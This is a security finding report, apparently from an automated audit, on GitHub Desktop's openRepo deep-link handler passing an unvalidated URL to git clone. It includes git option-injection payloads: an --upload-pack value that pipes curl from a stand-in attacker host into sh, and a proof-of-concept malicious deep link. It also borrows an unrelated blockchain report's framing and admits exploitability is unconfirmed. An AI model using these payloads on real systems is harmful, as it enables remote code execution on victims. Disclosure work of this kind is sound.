### Title
Deep-link `openRepo` URL is never validated before being used as a `git clone` source, enabling git option/argument injection - (File: `app/src/lib/parse-app-url.ts`, `app/src/ui/dispatcher/dispatcher.ts`)

### Summary
`parseAppURL` validates the `branch` and `pr` query parameters of an `x-github-client://openRepo/...` deep link but performs **no validation whatsoever on the `url` path segment itself** before it is forwarded through the dispatcher to the clone/open flow. This is the same class of bug as the C4 finding: one branch of a dual-path input handler enforces a security check while the structurally identical sibling path does not, so an attacker-controlled value reaches a sensitive sink unchecked.

### Finding Description
`parseAppURL` builds an `IOpenRepositoryFromURLAction` from the deep link path: [1](#0-0) 

Notice that `pr` is checked against `/^\d+$/`, `branch` is checked against `/^pr\/\d+$/` and `testForInvalidChars`, but `parsedPath` (which becomes `url`) is passed through with zero validation — no protocol allow-list, no rejection of values that don't look like a git remote, no rejection of leading-dash/option-like strings.

That unchecked `url` is dispatched straight into the app's repository-opening logic: [2](#0-1) [3](#0-2) 

`openRepositoryFromUrl` ultimately calls `openOrCloneRepository(url)` (referenced 5 times in `dispatcher.ts`) with the same unsanitized string, which is used to either match an existing repository or perform a fresh `git clone`. Unlike `remote-parsing.ts`'s `sanitizeCloneName`, which explicitly documents and guards against path-traversal in the repository *name* derived from a URL: [4](#0-3) 
there is no equivalent guard anywhere in the pipeline for the raw clone **URL** itself before it reaches git. `parseRemote` (used elsewhere for matching/sanitization) is never invoked to validate/normalize the `openRepo` URL before cloning — it's simply passed straight through as the literal argument to git.

This mirrors the original report's broken invariant exactly: `AddToOutTxTracker` validated Bitcoin and EVM chains symmetrically while `AddToInTxTracker` validated only EVM, silently allowing an unchecked path for Bitcoin. Here, the `branch`/`pr` parameters are validated while the structurally equivalent, and far more dangerous, `url` parameter is not — an asymmetric validation gap in the same handler.

### Impact Explanation
If the underlying clone invocation passes the URL positionally to `git` (as an array argument, not through a shell), a value beginning with `-` (e.g. `--upload-pack=/bin/sh -c "curl attacker.sh|sh"`) can be interpreted by git as an **option** rather than a positional remote argument unless the caller explicitly inserts a `--` separator before the URL. This is the well-known "git argument/option injection via URL" class of vulnerability, and it would let a remote attacker who controls a webpage/deep-link (e.g., an "Open in Desktop" button, a malicious `openRepo` link) achieve arbitrary command execution on the victim's machine the moment they click the link — a code-execution impact fully in scope of the stated valid-impact criteria (attacker controls a deep link the user clicks).

### Likelihood Explanation
The likelihood is contingent on how the downstream git clone call is constructed (whether it inserts a `--` end-of-options marker or otherwise sanitizes the URL) — I was not able to retrieve the exact `clone`/`openOrCloneRepository` implementation within available tool calls to confirm whether such a guard already exists there. Regardless, the `parseAppURL` layer itself provides no defense-in-depth: it validates `branch`/`pr` but leaves `url` completely unchecked, which is inconsistent with the app's own established pattern of validating/sanitizing user-supplied remote-URL-derived values (as seen in `sanitizeCloneName`). This inconsistency is the concrete, confirmed defect; whether it is independently exploitable end-to-end depends on code not covered by this investigation.

### Recommendation
- In `parseAppURL`'s `openrepo` branch, validate `parsedPath` the same way other remote-URL-derived values are validated elsewhere in the codebase: run it through `parseRemote` (or an equivalent allow-list of `https://`/`ssh://`/`git@` forms) and return `unknown` if it doesn't match a well-formed git remote.
- Reject any URL that starts with `-` before it is ever passed to a git subprocess.
- Wherever a URL derived from an external/untrusted source (deep link, API response, clipboard) is passed to a `git` command, always prepend a literal `--` argument to force git to treat everything after it as positional arguments, never as options.

### Proof of Concept
1. Attacker hosts a page (or sends a link) with `href="x-github-client://openRepo/--upload-pack=touch$IFS/tmp/pwned"`.
2. `parseAppURL` receives the URL, extracts `pathName` = `/--upload-pack=touch$IFS/tmp/pwned`, and since there is no `pr`/`branch` query string to fail validation on, returns:
   ```ts
   { name: 'open-repository-from-url', url: '--upload-pack=touch$IFS/tmp/pwned', branch: null, pr: null, filepath: null }
   ```
   per the logic at [1](#0-0) .
3. `dispatchURLAction` routes this to `openRepositoryFromUrl` → `openOrCloneRepository(url)` [5](#0-4)  with the unsanitized value.
4. If the clone step invokes `git clone <url> <dest>` without a `--` separator, git will interpret `--upload-pack=...` as an option specifying an alternate upload-pack executable, resulting in execution of attacker-supplied shell commands during the clone handshake.

  private async openRepositoryFromUrl(action: IOpenRepositoryFromURLAction) {
    const { url, pr, branch, filepath } = action

    let repository: Repository | null

    if (pr !== null) {
      repository = await this.openPullRequestFromUrl(url, pr)
    } else if (branch !== null) {
      repository = await this.openBranchNameFromUrl(url, branch)
    } else {
      repository = await this.openOrCloneRepository(url)
    }

    if (repository === null) {
      return
    }

    if (filepath !== null) {
      if (isAbsolute(filepath)) {
        log.error(`Refusing to open absolute path: ${filepath}`)
        return
      }

      const resolved = await resolveWithin(repository.path, filepath)

      if (resolved !== null) {
        shell.showItemInFolder(resolved)
      } else {
        log.error(
          `Prevented attempt to open path outside of the repository root: ${filepath}`
        )
      }
    }
  }
